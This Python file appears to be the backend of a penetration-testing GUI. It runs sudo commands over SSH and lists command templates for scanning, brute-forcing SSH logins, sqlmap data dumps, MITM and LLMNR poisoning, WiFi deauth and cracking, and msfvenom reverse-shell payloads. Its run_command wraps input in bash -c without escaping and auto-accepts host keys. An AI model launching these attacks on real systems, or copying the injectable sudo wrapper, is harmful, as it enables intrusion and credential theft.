# backend.py
import paramiko
from dataclasses import dataclass, field
from typing import List, Dict




# ===================================================
#  SSH BACKEND
# ===================================================

class RedTeamToolkitBackend:
    def __init__(self):
        self.client = None
        self.password = None
    def connect(self, host: str, username: str, password: str):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.client.connect(hostname=host, username=username, password=password)
        self.password = password

    def is_connected(self) -> bool:
        return (
            self.client is not None
            and self.client.get_transport() is not None
            and self.client.get_transport().is_active()
        )

    def disconnect(self):
        if self.client:
            self.client.close()
            self.client = None

    def run_command(self, command: str):
        if not self.is_connected():
            raise RuntimeError("SSH connection is not active.")


        sudo_command = f"sudo -S -k bash -c '{command}' 2>/dev/null"

        transport = self.client.get_transport()
        session = transport.open_session()
        session.exec_command(sudo_command)


        stdin = session.makefile_stdin("w")
        stdin.write(self.password + "\n")
        stdin.flush()

        stdout = session.makefile("r").read()
        stderr = session.makefile_stderr("r").read()

        if isinstance(stdout, bytes):
            stdout = stdout.decode("utf-8", errors="replace")
        if isinstance(stderr, bytes):
            stderr = stderr.decode("utf-8", errors="replace")

        exit_status = session.recv_exit_status()
        return exit_status, stdout, stderr


# ===================================================
#  TOOL DEFINITIONS
# ===================================================

@dataclass
class ToolParam:
    name: str
    label: str
    default: str = ""
    required: bool = False
    placeholder: str = ""


@dataclass
class Tool:
    name: str
    command_template: str
    params: List[ToolParam] = field(default_factory=list)
    description: str = ""
    help_text: str = ""



# ===================================================
# TOOL CATEGORIES
# ===================================================

TOOL_CATEGORIES: Dict[str, List[Tool]] = {

    # ====================================================================
    # 1. FOOTPRINTING & RECONNAISSANCE
    # ====================================================================
    "Footprinting & Reconnaissance": [
        Tool(
            name="Nmap – fast port scan",
            command_template="nmap {flags} {target}",
            description="Quick TCP SYN scan of all ports.",
            params=[
                ToolParam("target", "Target (IP/domain)", "192.168.1.1", True),
                ToolParam("flags", "Nmap flags", "-sS -T4 -p-", False),
            ],
            help_text="""
Nmap flags:
  -sS       SYN scan (stealth)
  -sU       UDP scan
  -sV       Service version detection
  -sC       Default NSE scripts
  -A        Aggressive (OS detect + scripts + traceroute)
  -O        OS fingerprinting
  -p-       Scan all ports
  -p80,443  Only selected ports
  -T0-5     Timing (0=slow,5=insane)
  -Pn       Skip host discovery
  -n        No DNS resolution

Examples:
  nmap -sS -T4 -p- 192.168.1.1
  nmap -sV -sC -A target.com
"""
        ),
        Tool(
            name="Nmap – ping sweep",
            command_template="nmap {flags} {target}",
            description="Host discovery on a network.",
            params=[
                ToolParam("target", "Target range", "192.168.1.0/24", True),
                ToolParam("flags", "Flags", "-sn", False),
            ],
            help_text="""
Flags:
  -sn       Ping scan (no port scan)
"""
        ),
        Tool(
            name="theHarvester – email/host harvesting",
            command_template="theHarvester -d {domain} -b {sources}",
            description="Gather emails, hosts and subdomains from public sources.",
            params=[
                ToolParam("domain", "Domain", "example.com", True),
                ToolParam("sources", "Sources", "all", False,
                             "google,bing,linkedin,crtsh,all"),
            ],
            help_text="""
Sources:
  google, bing, yahoo, baidu, linkedin, crtsh, twitter, all

Examples:
  theHarvester -d tesla.com -b all
"""
        ),
        Tool(
            name="DNSenum – DNS enumeration",
            command_template="dnsenum {domain}",
            description="Brute force subdomains and DNS info.",
            params=[
                ToolParam("domain", "Domain", "example.com", True),
            ],
            help_text="""
Basic DNS enumeration of NS, MX, and subdomains.
"""
        ),
        Tool(
            name="Sublist3r – subdomain enumeration",
            command_template="sublist3r -d {domain} -t {threads}",
            description="Fast subdomain enumeration.",
            params=[
                ToolParam("domain", "Domain", "example.com", True),
                ToolParam("threads", "Threads", "10", False),
            ],
            help_text="""
Flags:
  -d DOMAIN     Target domain
  -t THREADS    Threads

Example:
  sublist3r -d example.com -t 50
"""
        ),
        Tool(
            name="Amass – passive subdomain enum",
            command_template="amass enum -d {domain}",
            description="Large-scale subdomain enumeration.",
            params=[
                ToolParam("domain", "Domain", "example.com", True),
            ],
        ),
        Tool(
            name="Whois – domain information",
            command_template="whois {domain}",
            description="WHOIS information for a domain.",
            params=[
                ToolParam("domain", "Domain", "example.com", True),
            ],
        ),
        Tool(
            name="WhatWeb – fingerprint web technologies",
            command_template="whatweb {flags} {url}",
            description="Identify CMS, frameworks, versions, plugins.",
            params=[
                ToolParam("url", "URL", "http://testphp.vulnweb.com", True),
                ToolParam("flags", "Flags", "", False),
            ],
            help_text="""
Flags:
  -v           Verbose mode
  -a 1-4       Aggression level
  --follow-redirect    Follow redirects
"""
        ),
        Tool(
            name="WAFW00F – WAF detection",
            command_template="wafw00f {url}",
            description="Detect Web Application Firewalls.",
            params=[
                ToolParam("url", "URL", "http://testphp.vulnweb.com", True),
            ],
        ),
    ],

    # ====================================================================
    # 2. SCANNING NETWORKS
    # ====================================================================
    "Scanning Networks": [
        Tool(
            name="Nmap – service/version scan",
            command_template="nmap -sV {target}",
            description="Identify services and versions.",
            params=[
                ToolParam("target", "Target", "192.168.1.10", True),
            ],
        ),
        Tool(
            name="Nmap – OS detection",
            command_template="nmap -O {target}",
            description="OS fingerprinting.",
            params=[
                ToolParam("target", "Target", "192.168.1.10", True),
            ],
        ),
        Tool(
            name="Nmap – NSE vuln scripts",
            command_template="nmap --script vuln {target}",
            description="Run default vulnerability NSE scripts.",
            params=[
                ToolParam("target", "Target", "192.168.1.10", True),
            ],
        ),
        Tool(
            name="Netcat – banner grabbing",
            command_template="nc {target} {port}",
            description="Connect to a TCP port to grab banners.",
            params=[
                ToolParam("target", "Target", "192.168.1.10", True),
                ToolParam("port", "Port", "80", True),
            ],
        ),
        Tool(
            name="Hping3 – custom TCP SYN scan",
            command_template="hping3 -S -p {port} -c {count} {target}",
            description="Crafted packet scanning.",
            params=[
                ToolParam("target", "Target", "192.168.1.10", True),
                ToolParam("port", "Port", "80", True),
                ToolParam("count", "Packet count", "3", False),
            ],
        ),
    ],

    # ====================================================================
    # 3. ENUMERATION
    # ====================================================================
    "Enumeration": [
        Tool(
            name="Enum4linux – SMB enumeration",
            command_template="enum4linux {flags} {target}",
            description="Enumerate SMB shares, users, groups, policies.",
            params=[
                ToolParam("target", "Target", "192.168.1.15", True),
                ToolParam("flags", "Flags", "-a", False),
            ],
            help_text="""
Flags:
  -a   All basic enumeration
  -U   Users
  -S   Shares
  -G   Groups
  -P   Password policy
"""
        ),
        Tool(
            name="Snmpwalk – SNMP enumeration",
            command_template="snmpwalk -v2c -c {community} {target}",
            description="SNMP enumeration of devices.",
            params=[
                ToolParam("target", "Target", "192.168.1.20", True),
                ToolParam("community", "Community", "public", True),
            ],
        ),
        Tool(
            name="LDAPSearch – LDAP enumeration",
            command_template="ldapsearch -x -H ldap://{target} -b {base_dn}",
            description="Enumerate LDAP directories.",
            params=[
                ToolParam("target", "LDAP server", "192.168.1.30", True),
                ToolParam("base_dn", "Base DN", "dc=example,dc=com", True),
            ],
        ),
        Tool(
            name="Kerbrute – AD user enumeration",
            command_template="kerbrute userenum -d {domain} --dc {dc} {userlist}",
            description="Enumerate valid AD users via Kerberos.",
            params=[
                ToolParam("domain", "Domain", "example.com", True),
                ToolParam("dc", "Domain Controller", "dc.example.com", True),
                ToolParam("userlist", "Userlist path", "users.txt", True),
            ],
        ),
    ],

    # ====================================================================
    # 4. VULNERABILITY ANALYSIS
    # ====================================================================
    "Vulnerability Analysis": [
        Tool(
            name="Nessus (CLI) – scan",
            command_template="nessuscli ls-scans",
            description="Manage Nessus scans (requires Nessus).",
        ),
        Tool(
            name="OpenVAS / Greenbone – start scanner",
            command_template="gvm-start",
            description="Start Greenbone/OpenVAS services on Kali.\n(You usually configure scans via web UI.)",
        ),
        Tool(
            name="Nikto – web vulnerability scan",
            command_template="nikto -h {url} {flags}",
            description="Basic web server vulnerability scanner.",
            params=[
                ToolParam("url", "URL", "http://testphp.vulnweb.com", True),
                ToolParam("flags", "Flags", "", False),
            ],
        ),
        Tool(
            name="Nmap – vuln script scan",
            command_template="nmap --script vuln {target}",
            description="Runs various vulnerability detection scripts.",
            params=[
                ToolParam("target", "Target", "192.168.1.10", True),
            ],
        ),
    ],

    # ====================================================================
    # 5. SYSTEM HACKING / PASSWORD ATTACKS
    # ====================================================================
    "System Hacking & Password Attacks": [
        Tool(
            name="Hydra – SSH bruteforce",
            command_template="hydra -l {user} -P {wordlist} {flags} ssh://{target}",
            description="Bruteforce SSH credentials.",
            params=[
                ToolParam("target", "Target", "192.168.1.10", True),
                ToolParam("user", "Username", "root", True),
                ToolParam("wordlist", "Password list",
                             "/usr/share/wordlists/rockyou.txt", True),
                ToolParam("flags", "Hydra flags", "-t 4", False),
            ],
            help_text="""
Main flags:
  -l USER      Single username
  -L FILE      User list
  -p PASS      Single password
  -P FILE      Password list
  -t THREADS   Threads (default 16)
  -f           Exit after first found login
"""
        ),
        Tool(
            name="Hydra – HTTP Basic Auth",
            command_template="hydra -L {userlist} -P {wordlist} {flags} {target} http-get {path}",
            description="Bruteforce HTTP Basic authentication.",
            params=[
                ToolParam("target", "Target host", "192.168.1.20", True),
                ToolParam("userlist", "User list", "users.txt", True),
                ToolParam("wordlist", "Password list", "passwords.txt", True),
                ToolParam("path", "Path", "/", True),
                ToolParam("flags", "Flags", "-t 4", False),
            ],
        ),
        Tool(
            name="Medusa – SSH bruteforce",
            command_template="medusa -h {target} -u {user} -P {wordlist} -M ssh {flags}",
            description="Alternative parallel login bruteforce tool.",
            params=[
                ToolParam("target", "Target", "192.168.1.10", True),
                ToolParam("user", "Username", "root", True),
                ToolParam("wordlist", "Password list",
                             "/usr/share/wordlists/rockyou.txt", True),
                ToolParam("flags", "Flags", "", False),
            ],
        ),
        Tool(
            name="John the Ripper – crack hashes",
            command_template="john {hashfile} {flags}",
            description="Offline password hash cracking.",
            params=[
                ToolParam("hashfile", "Hash file", "hashes.txt", True),
                ToolParam("flags", "Flags", "", False),
            ],
            help_text="""
Common modes:
  --wordlist=FILE   wordlist mode
  --rules           apply mangling rules
"""
        ),
        Tool(
            name="Hashcat – GPU cracking",
            command_template="hashcat -m {mode} -a 0 {hashfile} {wordlist} {flags}",
            description="GPU accelerated password cracking.",
            params=[
                ToolParam("mode", "Hash mode", "1000", True, "1000=NTLM, 0=MD5, 100=SHA1"),
                ToolParam("hashfile", "Hash file", "hashes.txt", True),
                ToolParam("wordlist", "Wordlist", "/usr/share/wordlists/rockyou.txt", True),
                ToolParam("flags", "Flags", "", False),
            ],
        ),
    ],

    # ====================================================================
    # 6. WEB APPLICATION HACKING & SQLi
    # ====================================================================
    "Web Application Hacking": [
        Tool(
            name="SQLMap – SQL injection",
            command_template='sqlmap -u "{url}" {flags}',
            description="Automated SQL injection testing and exploitation.",
            params=[
                ToolParam("url", "URL with parameter",
                             "http://testphp.vulnweb.com/listproducts.php?cat=1", True),
                ToolParam("flags", "Flags", "--batch --risk=2 --level=2", False),
            ],
            help_text="""
SQLMap flags:
  --batch          Non-interactive
  --risk=0-3       Risk level
  --level=1-5      Test depth
  --dbs            List databases
  --tables         List tables
  --dump           Dump table data
Examples:
  sqlmap -u "url" --dbs
  sqlmap -u "url" --dump
"""
        ),
        Tool(
            name="Burp Suite (CLI repeater via curl) – simple proxy test",
            command_template="curl -x http://127.0.0.1:8080 {url}",
            description="Send request through Burp proxy (Burp must be running).",
            params=[
                ToolParam("url", "URL", "http://testphp.vulnweb.com", True),
            ],
        ),
        Tool(
            name="XSStrike – XSS detection",
            command_template="xsstrike -u {url} {flags}",
            description="Advanced XSS detection and payload fuzzing.",
            params=[
                ToolParam("url", "URL", "http://testphp.vulnweb.com", True),
                ToolParam("flags", "Flags", "", False),
            ],
            help_text="""
Useful flags:
  --crawl     Crawl target
  --blind     Blind XSS
"""
        ),
        Tool(
            name="Dirb – directory brute force",
            command_template="dirb {url} {wordlist} {flags}",
            description="Directory brute forcing on web servers.",
            params=[
                ToolParam("url", "URL", "http://testphp.vulnweb.com", True),
                ToolParam("wordlist", "Wordlist",
                             "/usr/share/wordlists/dirb/common.txt", True),
                ToolParam("flags", "Flags", "", False),
            ],
        ),
        Tool(
            name="Gobuster – directory brute force",
            command_template="gobuster dir -u {url} -w {wordlist} {flags}",
            description="Fast directory brute forcing using Go.",
            params=[
                ToolParam("url", "URL", "http://testphp.vulnweb.com", True),
                ToolParam("wordlist", "Wordlist",
                             "/usr/share/wordlists/dirb/common.txt", True),
                ToolParam("flags", "Flags", "", False),
            ],
            help_text="""
Flags:
  -x EXT,EXT   File extensions
  -t N         Threads
  -q           Quiet
"""
        ),
    ],

    # ====================================================================
    # 7. SNIFFING & MITM
    # ====================================================================
    "Sniffing & MITM": [
        Tool(
            name="Tcpdump – packet capture",
            command_template="tcpdump -i {iface} {filter}",
            description="Low-level packet capture.",
            params=[
                ToolParam("iface", "Interface", "eth0", True),
                ToolParam("filter", "Filter (BPF)", "", False, "e.g. port 80"),
            ],
        ),
        Tool(
            name="Wireshark – GUI start",
            command_template="wireshark &",
            description="Start Wireshark GUI (if installed).",
        ),
        Tool(
            name="Bettercap – MITM framework",
            command_template="bettercap -iface {iface} {flags}",
            description="Powerful modular MITM framework.",
            params=[
                ToolParam("iface", "Interface", "eth0", True),
                ToolParam("flags", "Flags", "", False,
                             'e.g. -eval "net.probe on"'),
            ],
        ),
        Tool(
            name="Ettercap – ARP MITM",
            command_template="ettercap -T -M arp:remote /{target}//",
            description="ARP-based MITM (text mode).",
            params=[
                ToolParam("target", "Target network/IP", "192.168.1.0/24", True),
            ],
        ),
        Tool(
            name="Responder – LLMNR/NBNS poisoning",
            command_template="responder -I {iface} {flags}",
            description="Capture hashes via LLMNR/NBNS poisoning.",
            params=[
                ToolParam("iface", "Interface", "eth0", True),
                ToolParam("flags", "Flags", "-wd", False),
            ],
        ),
    ],

    # ====================================================================
    # 8. WIRELESS HACKING
    # ====================================================================
    "Wireless Hacking": [
        Tool(
            name="Airodump-ng – WiFi scan",
            command_template="airodump-ng {iface}",
            description="Monitor mode capture of WiFi networks.",
            params=[
                ToolParam("iface", "Monitor interface", "wlan0mon", True),
            ],
        ),
        Tool(
            name="Airodump-ng – targeted capture",
            command_template="airodump-ng --bssid {bssid} -c {channel} --write {outfile} {iface}",
            description="Capture handshake from specific AP.",
            params=[
                ToolParam("bssid", "AP BSSID", "AA:BB:CC:DD:EE:FF", True),
                ToolParam("channel", "Channel", "6", True),
                ToolParam("outfile", "Output prefix", "capture", True),
                ToolParam("iface", "Monitor interface", "wlan0mon", True),
            ],
        ),
        Tool(
            name="Aireplay-ng – deauth attack",
            command_template="aireplay-ng --deauth {count} -a {bssid} {iface}",
            description="Send deauth frames to disconnect clients.",
            params=[
                ToolParam("count", "Frame count", "5", True),
                ToolParam("bssid", "AP BSSID", "AA:BB:CC:DD:EE:FF", True),
                ToolParam("iface", "Monitor interface", "wlan0mon", True),
            ],
        ),
        Tool(
            name="Aircrack-ng – crack WPA/WPA2",
            command_template="aircrack-ng {capture} -w {wordlist}",
            description="Offline cracking of WPA/WPA2 handshakes.",
            params=[
                ToolParam("capture", "Capture file", "capture.cap", True),
                ToolParam("wordlist", "Wordlist", "/usr/share/wordlists/rockyou.txt", True),
            ],
        ),
    ],

    # ====================================================================
    # 9. MALWARE / PAYLOADS / METASPLOIT
    # ====================================================================
    "Malware & Payloads": [
        Tool(
            name="Msfvenom – Windows reverse shell",
            command_template=(
                "msfvenom -p windows/x64/shell_reverse_tcp "
                "LHOST={lhost} LPORT={lport} -f exe -o {outfile}"
            ),
            description="Generate a Windows reverse shell EXE.",
            params=[
                ToolParam("lhost", "LHOST", "192.168.1.100", True),
                ToolParam("lport", "LPORT", "4444", True),
                ToolParam("outfile", "Output file", "shell.exe", True),
            ],
        ),
        Tool(
            name="Msfvenom – Linux reverse shell",
            command_template=(
                "msfvenom -p linux/x64/shell_reverse_tcp "
                "LHOST={lhost} LPORT={lport} -f elf -o {outfile}"
            ),
            description="Generate a Linux reverse shell ELF.",
            params=[
                ToolParam("lhost", "LHOST", "192.168.1.100", True),
                ToolParam("lport", "LPORT", "4444", True),
                ToolParam("outfile", "Output file", "shell.elf", True),
            ],
        ),
        Tool(
            name="Msfvenom – Android meterpreter",
            command_template=(
                "msfvenom -p android/meterpreter/reverse_tcp "
                "LHOST={lhost} LPORT={lport} -o {outfile}"
            ),
            description="Generate Android Meterpreter APK.",
            params=[
                ToolParam("lhost", "LHOST", "192.168.1.100", True),
                ToolParam("lport", "LPORT", "4444", True),
                ToolParam("outfile", "APK file", "evil.apk", True),
            ],
        ),
        Tool(
            name="Metasploit – start msfconsole",
            command_template="msfconsole",
            description="Start Metasploit Framework console.",
        ),
    ],

    # ====================================================================
    # 10. POST-EXPLOITATION / PRIVESC
    # ====================================================================
    "Post-Exploitation & PrivEsc": [
        Tool(
            name="LinPEAS – Linux privesc check",
            command_template="linpeas.sh",
            description="Local Linux privilege escalation auditing.",
        ),
        Tool(
            name="LinEnum – Linux enumeration",
            command_template="linenum.sh",
            description="Linux local enumeration.",
        ),
        Tool(
            name="WinPEAS – Windows privesc check",
            command_template="winpeas.exe",
            description="Local Windows privilege escalation auditing.",
        ),
        Tool(
            name="BloodHound (ingestor) – SharpHound",
            command_template="SharpHound.exe -c All",
            description="Collect AD data for BloodHound analysis.",
        ),
    ],

    # ====================================================================
    # 11. CRYPTOGRAPHY & MISC
    # ====================================================================
    "Cryptography & Misc": [
        Tool(
            name="Hash-identifier – detect hash type",
            command_template="hash-identifier",
            description="Identify probable hash types.",
        ),
        Tool(
            name="OpenSSL – generate random hex",
            command_template="openssl rand -hex {bytes}",
            description="Generate random bytes in hex.",
            params=[
                ToolParam("bytes", "Number of bytes", "16", True),
            ],
        ),
    ],
}
